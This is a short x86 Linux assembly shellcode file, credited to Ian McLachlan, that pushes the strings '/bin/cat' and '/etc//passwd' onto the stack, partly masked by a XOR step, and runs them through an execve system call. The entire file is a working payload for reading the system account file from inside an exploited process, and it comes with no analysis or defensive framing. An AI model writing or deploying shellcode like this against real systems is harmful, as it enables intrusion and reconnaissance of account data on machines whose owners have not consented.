;my version of the cat /etc/passwd
; Author: Ian McLachlan

section .text
    global _start
_start:

mov eax, 0x0
xor edx, edx
push 0x0
mov esi, 0x7461632f
mov ebx, esi
push ebx
push 0x6e69622f
mov ebx,esp
push edx
mov edi, 0x64777373
xor edi, 0xaa
mov esi, edi
xor esi, 0xaa
push esi
mov esi, 0x61702f2f
push esi
push dword 0x6374652f
mov ecx,esp
mov al, 11
push edx
push ecx
push ebx
mov ecx,esp
int 0x80


